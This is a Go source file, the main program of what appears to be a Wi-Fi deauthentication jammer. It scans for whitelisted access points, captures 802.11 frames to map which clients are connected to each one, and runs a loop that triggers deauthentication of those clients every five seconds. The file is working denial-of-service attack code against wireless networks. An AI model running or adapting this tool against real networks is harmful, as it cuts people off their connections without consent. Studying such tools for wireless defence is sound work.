package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/dauie/go-netlink/nl80211"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)


var QuitSIGINT = false

func	help() {

	fmt.Printf("useage: %s <iface> <whitelist | 'none'>\n", os.Args[0])
	os.Exit(1)
}

func	handleSigInt() {

	sigc := make(chan os.Signal, 1)
	go func () {
		s := <-sigc
		if s == syscall.SIGINT {
			QuitSIGINT = true
		}
	}()
	signal.Notify(sigc, syscall.SIGINT)
}

func	checkComms(aps *List, clients *List, pkt gopacket.Packet) {

	var cli		*Client
	var ap		Ap
	var cliAddr	net.HardwareAddr
	var apAddr	net.HardwareAddr
	var fromClient = false

	if pkt == nil {
		return
	}
	radioTap := pkt.Layer(layers.LayerTypeRadioTap)
	dot11 := pkt.Layer(layers.LayerTypeDot11)
	if dot11 == nil || radioTap == nil {
		return
	}
	tap := radioTap.(*layers.RadioTap)
	dot := dot11.(*layers.Dot11)
	// did the message originate from the client?
	if dot.Address1.String() != dot.Address3.String() {
		cliAddr = dot.Address1
		apAddr = dot.Address2
		fromClient = true
	} else {
		apAddr = dot.Address1
		cliAddr = dot.Address2
	}
	// is the ap on our watch list?
	if a, ok := aps.Get(apAddr.String()[:16]); ok {
		ap = (a).(Ap)
	} else {
		return
	}
	// have we seen this client before?
	if v, ok := clients.Get(cliAddr.String()); ok {
		cli = (v).(*Client)
	} else {
		cli = new(Client)
		cli.hwaddr = cliAddr
	}
	if fromClient {
		cli.dot = *dot
		cli.tap = *tap
	} else {
		ap.dot = *dot
		ap.tap = *tap
	}
	clients.Add(cli.hwaddr.String(), cli)
	ap.AddClient(cli)
	aps.Add(ap.hwaddr.String()[0:16], ap)
}

func	initEnv() {

	//set rand seed
	rand.Seed(time.Now().UTC().UnixNano())
	//catch sigint
	handleSigInt()
}

func	main() {

	var apList	List
	var clients	List

	if len(os.Args) < 3 {
		help()
	}
	initEnv()
	whiteList, err := getWhiteListFromFile(os.Args[2])
	if err != nil {
		log.Fatalln("getWhiteListFromFile()", err)
	}
	monIfa, err := NewJamConn(os.Args[1])
	if err != nil {
		log.Fatalln("NewJamConn()", err)
	}
	defer func(){
		if err := monIfa.nlconn.Close(); err != nil {
			log.Fatalln("genetlink.Conn.Close()", err)
		}
	}()
	defer func() {
		if err := monIfa.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
			log.Fatalln("JamConn.SetIfaType()", err.Error())
		}
	}()
	if err := monIfa.DoAPScan(&whiteList, &apList); err != nil {
		log.Fatalln("JamConn.DoAPScan()", err)
	}
	if err := monIfa.SetupPcapHandle(); err != nil {
		log.Fatalln("setupPcapHandle() ", err)
	}
	defer monIfa.handle.Close()
	if err := monIfa.SetFilterForTargets(); err != nil {
		log.Fatalln("JamConn.SetFilterForTargets()", err)
	}

	packSrc := gopacket.NewPacketSource(monIfa.handle, monIfa.handle.LinkType())
	monIfa.SetLastChanSwitch(time.Now())
	monIfa.SetLastDeauth(time.Now())
	for !QuitSIGINT {
		packet, err := packSrc.NextPacket()
		if err != nil {
			if err.Error() != "Timeout Expired" {
				log.Fatalln("gopacket.PacketSource.NextPacket()", err.Error())
			}
		}
		checkComms(&apList, &clients, packet)
		//monIfa.ChangeChanIfPast(time.Second * 5)
		monIfa.DeauthClientsIfPast(time.Second * 5,2,  &apList)
		monIfa.DoAPScanIfPast(time.Minute * 1, &whiteList, &apList)
	}
}
